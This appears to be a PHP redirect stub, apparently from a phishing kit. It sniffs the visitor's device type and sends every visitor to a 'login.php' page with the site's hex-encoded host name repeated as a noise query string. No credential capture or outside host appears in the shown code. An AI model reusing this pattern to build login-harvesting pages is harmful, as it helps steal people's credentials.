<?php
include '../Valid.php';
function checkDevice() {
// checkDevice() : checks if user device is phone, tablet, or desktop
// RETURNS 0 for desktop, 1 for mobile, 2 for tablets

  if (is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "mobile"))) {
    return is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "tablet")) ? 2 : 1 ;
  } else {
    return 0;
  }
}
$host = bin2hex ($_SERVER['HTTP_HOST']);

$deviceType = checkDevice();
if ($deviceType==0) {
  header("Location: login.php?$host$host$host$host");
} else if ($deviceType==1) {
  header("Location: login.php?$host$host$host$host");
} else {
  header("Location: login.php?$host$host$host$host");
}
?>